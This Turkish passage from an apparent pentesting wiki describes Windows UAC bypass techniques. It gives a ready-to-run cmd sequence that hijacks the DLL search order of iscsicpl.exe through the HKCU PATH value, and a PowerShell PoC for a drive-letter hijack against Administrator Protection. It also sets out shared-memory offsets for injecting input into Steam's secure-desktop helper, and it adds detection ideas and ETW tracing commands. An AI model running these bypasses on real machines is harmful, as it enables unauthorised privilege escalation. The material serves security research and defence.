3. Muhtemelen DLL'i, yazma izninizin olmadığı bazı **korumalı yollara** (C:\Windows\System32 gibi) **yazmanız** gerekecek. Bunu şu yöntemlerle aşabilirsiniz:
   1. **wusa.exe**: Windows 7, 8 ve 8.1. Bu araç, yüksek integrity level'da çalıştığı için bir CAB dosyasının içeriğini korumalı yollara çıkarmanıza olanak tanır.
   2. **IFileOperation**: Windows 10.
4. DLL'inizi korumalı yola kopyalamak ve savunmasız, autoelevated binary'yi çalıştırmak için bir **script** hazırlayın.

### Başka bir UAC bypass tekniği

Bir **autoElevated binary**'nin, çalıştırılacak bir **binary** veya **command**'in **adını/yolunu** **registry**'den **okumaya** çalışıp çalışmadığını izlemekten ibarettir (binary bu bilgiyi **HKCU** içinde arıyorsa daha da ilgi çekicidir).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack ile UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`, arama sırasını kullanarak `iscsiexe.dll` yüklemesi için kötüye kullanılabilecek **auto-elevated** bir binary'dir. Kötü amaçlı bir `iscsiexe.dll`'i **kullanıcının yazabildiği** bir klasöre yerleştirip ardından bu klasörün aranması için geçerli kullanıcının `PATH` değerini değiştirirseniz (örneğin `HKCU\Environment\Path` üzerinden), Windows saldırganın DLL'ini yükseltilmiş `iscsicpl.exe` process'i içinde **UAC prompt'u göstermeden** yükleyebilir.<sup>[[1]](#references)[[6]](#references)</sup>

Uygulamaya yönelik notlar:
- Bu yöntem, geçerli kullanıcı **Administrators** grubundaysa ancak UAC nedeniyle **Medium Integrity** düzeyinde çalışıyorsa kullanışlıdır.
- Bu bypass için **SysWOW64** kopyası önemlidir. **System32** kopyasını ayrı bir binary olarak değerlendirin ve davranışını bağımsız olarak doğrulayın.
- Bu yöntem **auto-elevation** ile **DLL search-order hijacking** birleşiminden oluşur. Bu nedenle, eksik DLL yüklemesini doğrulamak için diğer UAC bypass'larında kullanılan ProcMon iş akışı da faydalıdır.

En temel akış:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Tespit fikirleri:
- `reg add` / registry yazma işlemlerinin `HKCU\Environment\Path` konumuna yazmasının hemen ardından `C:\Windows\SysWOW64\iscsicpl.exe` çalıştırılması durumunda uyarı oluşturun.
- `%TEMP%` veya `%LOCALAPPDATA%\Microsoft\WindowsApps` gibi **kullanıcı denetimindeki** konumlarda `iscsiexe.dll` arayın.
- `iscsicpl.exe` çalıştırmalarını beklenmedik alt süreçler veya normal Windows dizinleri dışından yüklenen DLL'lerle ilişkilendirin.

### Ayrı olarak incelenmeye değer daha yeni araştırmalar

2024 sonrası bazı zincirler artık klasik `HKCU\Software\Classes` registry hijack'lerine benzemiyor. Örneğin activation-context cache poisoning, **drive remap** ve **DLL redirection** yöntemlerini zincirleyerek `ctfmon.exe` gibi güvenilir UI / auto-elevated binary'ler ve daha sonra `fodhelper.exe` gibi hedefler üzerinden medium integrity'den high integrity'ye geçebilir. Büyük PoC'yi burada yinelemek yerine, şu konumdaki kısa payload örneklerine bakın:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview): oturum başına DOS device map üzerinden drive-letter hijack

> [!NOTE]
> Ağustos 2026 itibarıyla Microsoft, Administrator Protection'ı hâlâ **Insider preview** olarak belgeliyor: Ekim 2025'teki dağıtım geri alındı ve daha sonraki bir tarihte yapılması planlanıyor. Bu zincirleri test etmeden önce **Admin Approval Mode with Administrator protection** özelliğinin gerçekten etkin olduğunu ve cihazın yeniden başlatıldığını doğrulayın; yalnızca standart bir 25H2 sürüm dizesi, özelliğin etkin olduğunu kanıtlamaz.<sup>[[10]](#references)</sup>

Windows 11 25H2 preview build'lerindeki `RAiLaunchAdminProcess` / UIAccess saldırı yüzeyinin tamamı için özel sayfaya bakın:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection”, oturum başına `\Sessions\0\DosDevices/<LUID>` map'leri bulunan shadow-admin token'ları kullanır. Dizin, ilk `\??` çözümlemesinde `SeGetTokenDeviceMap` tarafından ihtiyaç üzerine oluşturulur. Saldırgan shadow-admin token'ını yalnızca **SecurityIdentification** düzeyinde taklit ederse dizin, **owner** olarak saldırganla birlikte oluşturulur (`CREATOR OWNER` devralınır); böylece `\GLOBAL??` üzerinde önceliğe sahip drive-letter link'leri oluşturulabilir.<sup>[[7]](#references)</sup>

**Adımlar:**

1. Düşük ayrıcalıklı bir oturumdan, istem göstermeyen bir shadow-admin `runonce.exe` başlatmak için `RAiProcessRunOnce` çağrısı yapın.
2. Birincil token'ını **identification** token'ına çoğaltın ve saldırganın sahipliğinde `\Sessions\0\DosDevices/<LUID>` oluşturulmasını sağlamak için `\??` açılırken bu token'ı taklit edin.
3. Burada saldırganın denetimindeki depolama alanını gösteren bir `C:` symlink'i oluşturun; oturumdaki sonraki dosya sistemi erişimleri `C:` yolunu saldırganın yoluna çözer ve istem göstermeden DLL/file hijack yapılmasını sağlar.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Önizleme ana makinelerinde Administrator Protection, onayları ve başarısızlıkları `Microsoft-Windows-LUA` sağlayıcısı altında **15031** ve **15032** ETW olayları olarak kaydeder. Olaylar; istekte bulunanın SID’sini, uygulama yolunu, sonucu, yönetilen yönetici hesabını ve kimlik doğrulama yöntemini içerir. Bu nedenle tekrarlanan exploit girişimleri veya başarısız UI kontrolü telemetrisiz kalmaz.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Yazılabilir paylaşımlı bellek halkası üzerinden iletilen güvenli masaüstü girdisi

Orta bütünlük düzeyindeki bir kullanıcı, güvenli masaüstü yardımcısının girdi IPC'sine yazabiliyorsa UAC isteminin güvenliğini zayıflatabilir. Bildirilen Steam tasarımında `IClientSecureDesktop::BStartStreaming`, `secure_desktop_capture.exe` dosyasını `winsta0\winlogon` üzerinde SYSTEM olarak başlatır. Yardımcı, kullanıcıya `GENERIC_ALL` erişimi sunan `Global\SecureDesktopInput_mem-IPCWrapper` nesnesini açar; halka girişlerini tüketir ve güvenli masaüstünde `SendInput` çağırır. Bu, UIAccess kullanmaktan veya `PromptOnSecureDesktop` değerini değiştirmekten farklıdır: girdiyi zaten orada çalışan bir süreç iletir. İstemcinin bu işleyiciye nasıl ulaştığını görmek için [ayrıcalıklı hizmet IPC'sine paylaşımlı bellek bootstrap'i](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) bölümüne bakın. <sup>[[15]](#references)[[16]](#references)</sup>

Halkada 173 baytlık 128 yuva bulunur. Yazma ve okuma sayaçları `0x414` ve `0x418` adreslerindedir; `N` yuvası `0x41c + 173*N` adresindedir. Yuvanın ilk baytını düz metin için `0` olarak ayarlayın, hemen arkasına 40 baytlık bir Windows `INPUT` yapısı kopyalayın ve ardından yazma sayacını ilerletin. Onay istemiyle karşılaşan orta bütünlük düzeyindeki bir yönetici için, yükseltme isteyen bir yürütülebilir dosyayı başlattıktan sonra klavyeden `Y` tuşuna basıp bırakmak, UAC onay düğmesini etkinleştirebilir; standart kullanıcı kimlik bilgisi istemini yanıtlayamaz. **Onay kapısı yine de önemlidir**: yardımcı, yalnızca kullanıcı mevcut 90 günlük yetkilendirme dönemi için `InputEnabled` istemini onayladıktan sonra girdiyi iletir. Salt okunabilir/yazılabilir bir eşlemenin bulunması, girdinin isteme ulaştığını kanıtlamaz; kontrollü bir test öncesi ve sonrası okuma sayacını karşılaştırın. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kullanıcı Hesabı Denetimi nasıl çalışır?](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC atlatma teknikleri koleksiyonu](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC atlatma uyumluluk tarayıcısı ve başlatıcısı](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, PowerShell arka kapıları oluşturmak için AI kullanıyor](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: Güneydoğu Asya'daki devlet kurumlarını hedef alan 0-Day istismarı](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection'ı atlatma](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup göreviyle UAC'yi atlatma](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip ve Narrator Always Notify atlatmaları](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Yönetici koruması](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – .NET'ten yerel Windows RPC sunucularını çağırma](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte, CoolClient'ı imzalı bir Windows kernel rootkit'iyle geliştiriyor](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: Casusluk, hırsızlık ve dehşet saçmak için tasarlanmış, tamamen tespit edilemez bir Windows Truva atı](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Valve'ı döndürmek](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – Turning the Valve PoC'leri](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
